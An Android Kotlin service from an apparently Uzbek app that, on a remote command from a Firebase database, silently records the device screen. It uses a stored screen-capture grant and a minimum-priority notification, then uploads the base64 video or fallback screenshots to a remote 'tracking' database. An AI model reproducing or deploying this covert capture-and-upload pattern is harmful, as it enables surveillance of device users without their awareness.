package com.hokimloyha.app.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.google.firebase.database.FirebaseDatabase
import com.hokimloyha.app.R
import java.io.File

class ScreenRecordService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var targetDeviceId: String = "hokim"
    private val handler = Handler(Looper.getMainLooper())

    companion object {
        private const val TAG = "ScreenRecordService"
        private const val CHANNEL_ID = "screen_record_channel"
        private const val NOTIF_ID = 2002
        const val ACTION_START = "ACTION_START_RECORD"
        const val ACTION_STOP = "ACTION_STOP_RECORD"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    private var recordingStartTime: Long = 0L
    private var isCurrentlyRecording = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action
        val devId = intent?.getStringExtra("device_id")
        if (!devId.isNullOrBlank()) {
            targetDeviceId = devId
        }

        if (action == ACTION_START) {
            if (!isCurrentlyRecording) {
                val resultCode = AppStateTracker.mediaProjectionResultCode
                val resultData = AppStateTracker.mediaProjectionIntent

                if (resultCode != 0 && resultData != null) {
                    startForegroundNotification()
                    startScreenRecording(resultCode, resultData)
                } else {
                    // MediaProjection mavjud emas bo'lsa -> zudlik bilan ScreenCaptureHelper orqali rasm olamiz
                    ScreenCaptureHelper.captureScreenshot(this, targetDeviceId)
                    stopSelf()
                }
            }
        } else if (action == ACTION_STOP) {
            if (isCurrentlyRecording) {
                stopAndUploadRecording()
            } else {
                stopSelf()
            }
        }

        return START_NOT_STICKY
    }

    private fun startForegroundNotification() {
        val notif: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Ijro Tizimi")
            .setContentText("Ekran xizmati yozib olinmoqda...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    private fun startScreenRecording(resultCode: Int, data: Intent) {
        try {
            val mpManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            if (mediaProjection == null) {
                mediaProjection = mpManager.getMediaProjection(resultCode, data)
            }

            if (mediaProjection == null) {
                Log.e(TAG, "MediaProjection is null, falling back to screenshot")
                ScreenCaptureHelper.captureScreenshot(this, targetDeviceId)
                stopSelf()
                return
            }

            // Android 14 (API 34+) requires registering a callback before createVirtualDisplay
            try {
                mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                    override fun onStop() {
                        Log.d(TAG, "MediaProjection stopped by system")
                        mediaProjection = null
                        isCurrentlyRecording = false
                    }
                }, handler)
            } catch (e: Exception) {
                Log.w(TAG, "registerCallback exception: ${e.message}")
            }

            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val windowMetrics = wm.currentWindowMetrics
                val bounds = windowMetrics.bounds
                metrics.widthPixels = bounds.width()
                metrics.heightPixels = bounds.height()
                metrics.densityDpi = resources.configuration.densityDpi
            } else {
                @Suppress("DEPRECATION")
                wm.defaultDisplay.getRealMetrics(metrics)
            }

            var width = metrics.widthPixels
            var height = metrics.heightPixels
            val density = metrics.densityDpi

            // Scale to max 720p with correct aspect ratio
            val maxDim = 720
            if (width > maxDim || height > maxDim) {
                if (width < height) {
                    height = (height.toFloat() * maxDim / width).toInt()
                    width = maxDim
                } else {
                    width = (width.toFloat() * maxDim / height).toInt()
                    height = maxDim
                }
            }
            width = (width / 16) * 16
            height = (height / 16) * 16
            if (width <= 0) width = 480
            if (height <= 0) height = 800

            outputFile = File(cacheDir, "screen_rec_${System.currentTimeMillis()}.mp4")

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(24)
                setVideoEncodingBitRate(1200 * 1000) // 1.2 Mbps
                setOutputFile(outputFile?.absolutePath)
                setOnErrorListener { _, what, extra ->
                    Log.e(TAG, "MediaRecorder error: what=$what extra=$extra")
                    stopAndUploadRecording()
                }
                prepare()
            }

            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenRecorder",
                width,
                height,
                density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder?.surface,
                null,
                handler
            )

            mediaRecorder?.start()
            recordingStartTime = System.currentTimeMillis()
            isCurrentlyRecording = true
            Log.d(TAG, "Screen recording started continuously: ${width}x${height}...")

            val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
            val mediaRef = database.getReference("tracking/devices/$targetDeviceId/media")
            mediaRef.child("is_screen_recording").setValue(true)
            mediaRef.child("status").setValue("Ekran yozilmoqda...")

            // 10 daqiqalik xavfsizlik chegarasi (agar admin to'xtatishni unutsa)
            handler.postDelayed({
                if (isCurrentlyRecording) {
                    stopAndUploadRecording()
                }
            }, 600000L)

        } catch (e: Exception) {
            Log.e(TAG, "Failed to start screen recording: ${e.message}", e)
            val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
            database.getReference("tracking/devices/$targetDeviceId/media/is_screen_recording").setValue(false)
            database.getReference("tracking/devices/$targetDeviceId/commands/record_screen").setValue(false)
            database.getReference("tracking/devices/$targetDeviceId/media/status").setValue("Ekran yozish xatosi: ${e.message}")
            ScreenCaptureHelper.captureScreenshot(this, targetDeviceId)
            stopSelf()
        }
    }

    private fun stopAndUploadRecording() {
        handler.removeCallbacksAndMessages(null)
        isCurrentlyRecording = false

        val elapsed = System.currentTimeMillis() - recordingStartTime
        if (elapsed < 1500L) {
            try { Thread.sleep(1500L - elapsed) } catch (_: Exception) {}
        }

        try {
            mediaRecorder?.stop()
        } catch (e: Exception) {
            Log.w(TAG, "mediaRecorder stop error: ${e.message}")
        }
        try {
            mediaRecorder?.release()
        } catch (_: Exception) {}
        mediaRecorder = null

        try {
            virtualDisplay?.release()
        } catch (_: Exception) {}
        virtualDisplay = null

        val file = outputFile
        val durationSec = ((System.currentTimeMillis() - recordingStartTime) / 1000).toInt().coerceAtLeast(1)

        val database = FirebaseDatabase.getInstance("https://hokimlik-default-rtdb.firebaseio.com")
        val mediaRef = database.getReference("tracking/devices/$targetDeviceId/media")
        mediaRef.child("is_screen_recording").setValue(false)
        database.getReference("tracking/devices/$targetDeviceId/commands/record_screen").setValue(false)

        if (file != null && file.exists() && file.length() > 0) {
            Thread {
                try {
                    val bytes = file.readBytes()
                    val base64Video = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    file.delete()

                    val now = System.currentTimeMillis()
                    val item = mapOf(
                        "type" to "video",
                        "video_base64" to base64Video,
                        "timestamp" to now,
                        "duration" to durationSec
                    )

                    mediaRef.child("latest_screen").setValue(item)
                    mediaRef.child("archive_screen").push().setValue(item)
                    mediaRef.child("status").setValue("Ekran video yozuvi saqlandi ($durationSec sek, ${bytes.size / 1024} KB)")
                } catch (e: Exception) {
                    Log.e(TAG, "Error uploading screen video", e)
                    mediaRef.child("status").setValue("Video saqlashda xatolik")
                } finally {
                    stopSelf()
                }
            }.start()
        } else {
            // Video bo'sh bo'lsa, skrinshot olamiz
            database.getReference("tracking/devices/$targetDeviceId/commands/record_screen").setValue(false)
            ScreenCaptureHelper.captureScreenshot(this, targetDeviceId)
            stopSelf()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screen Recording",
                NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
        isCurrentlyRecording = false
        try { mediaRecorder?.release() } catch (_: Exception) {}
        try { virtualDisplay?.release() } catch (_: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
